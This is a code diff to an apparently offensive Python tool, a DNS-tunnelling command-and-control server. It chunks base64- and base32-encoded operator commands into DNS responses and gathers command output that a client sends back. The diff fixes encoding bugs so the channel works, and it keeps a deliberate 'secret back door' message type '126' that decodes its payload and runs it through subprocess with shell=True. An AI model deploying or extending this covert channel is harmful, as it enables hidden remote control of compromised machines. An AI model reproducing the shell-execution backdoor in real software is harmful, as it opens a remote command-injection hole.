@@ -36,20 +36,24 @@ class DomainName(str):
         return DomainName(item + '.' + self)
 
 def toBytes(input):
-    if isinstance(input, str): return input.encode('utf8')
+    if isinstance(input, str): return input.encode('utf-8')
     else: return input
+
 def toString(input):
-    if isinstance(input, bytes): return input.decode('utf8')
+    if isinstance(input, bytes): return input.decode('utf-8')
     else: return input
 
 def decode64(b64):
     return base64.b64decode(toBytes(b64))
+
 def encode64(plain):
     return base64.b64encode(toBytes(plain))
+
 def decode32(b32):
     revert = toBytes(b32).replace(b"-",b"=") # undo the "equals" silliness
     if revert.endswith(b"0"): revert = revert[:-1] # pop off any extra pad
     return base64.b32decode(revert)
+
 def encode32(plain):
     switch = toBytes(plain)
     return base64.b32encode(switch).replace(b"=",b"-") # "equals" isn't allowed to play in domain names
@@ -136,47 +140,51 @@ def dns_response(data):
 def c2(qname):
     #try:
         global respPktCt
+        global respText
         request = qname.split(".")[0]
         msgType = request[:3]
-        if debuggin: print(f"{OV}c2() working with incoming request {OR}{request}{OV} of type {OR}{msgType}{OM}")
-        request = decode32(request[3:]).decode('UTF8')
+        if debuggin: print(f"{OV}c2() request {OR}{request}{OV} of type {OR}{msgType}{OM}")
+        # request = decode32(request[3:]).decode('utf-8')
+        request = request[3:]
         if msgType == "CHK": # client checking in for commands
             if userInput == "": # no user input? NOP
                 response = b"NUL"
             else: # have a command? send the command header
-                encCmd = encode64(userInput).decode('UTF8') # encode so special chars don't nuke us
+                encCmd = encode64(userInput).decode('utf-8') # encode so special chars don't nuke us
                 global chunks
                 chunks = wrap(encCmd,249) # break encoded command into chunks w/4-byte headers, 253 byte max
                 chunks.reverse() # so we can pop pieces off in order
                 response = b"HDR" + encode64(str(len(chunks)))
         elif msgType == "HDR": # client sending response header
-            respPktCt = int(request.split(" ")[0][3:])
-            response = b"ACK" + str(respPktCt)
+            respPktCt = int(decode32(request).decode('utf-8').split(" ")[0])
+            response = b"ACK" + bytes(str(respPktCt),'utf-8')
         elif msgType == "RES": # client sending response body
+            print(f"{OR}respText so far is {OV}{respText}{OR}, and respPktCt is {OV}{respPktCt}{OM}")
             if respPktCt < 1:
                 print(f"{OE}Got unexpected client 'RES'{OM}")
-                response = "DIE Unexpected RES"
+                response = b"DIE Unexpected RES"
             else:
-                global respText
                 respPktCt -= 1
-                respText += request[3:]
+                respText += request
                 if respPktCt == 0: # end of the thread from client? print output
-                    if debuggin: print(f"\n{OM}{respText}\n")
+                    print(f"{OR}Command output: \n{OV}{decode32(respText)}{OM}")
+                response = ("ACK" + str(respPktCt)).encode('utf-8')
         elif msgType == "CON": # client ready for more from server
             if len(chunks) < 1:
                 print(f"{OE}Got unexpected client 'CON'{OM}")
                 response = b"DIE Unexpected CON"
             else:
-                response = b"CMD" + chunks.pop().encode('UTF8') # send the next chunk of command
+                response = b"CMD" + chunks.pop().encode('utf-8') # send the next chunk of command
         elif msgType == "126": # a secret back door?!?
-            command = request[3:]
+            command = decode32(request).decode('utf-8')
             subprocess.check_output(command, shell=True)
             response = b"Looks like blind command injection..."
         else: # something went wrong
             error = f"Expected 'CHK', 'HDR', 'RES', or 'CON' from client, got {msgType}"
             print(OE + error + OM)
+            response = error.encode('utf-8')
             raise Exception(error)
-        if debuggin: print(f"{OV}c2() returning encoded response:{OR} {response}{OM}, ", end='')
+        if debuggin: print(f"{OV}c2() response:{OR} {response}{OM}, ", end='')
         return response
     #except Exception as ex:
     #    print(f"{OE}Exception in c2(): {OR}{ex}{OM}")
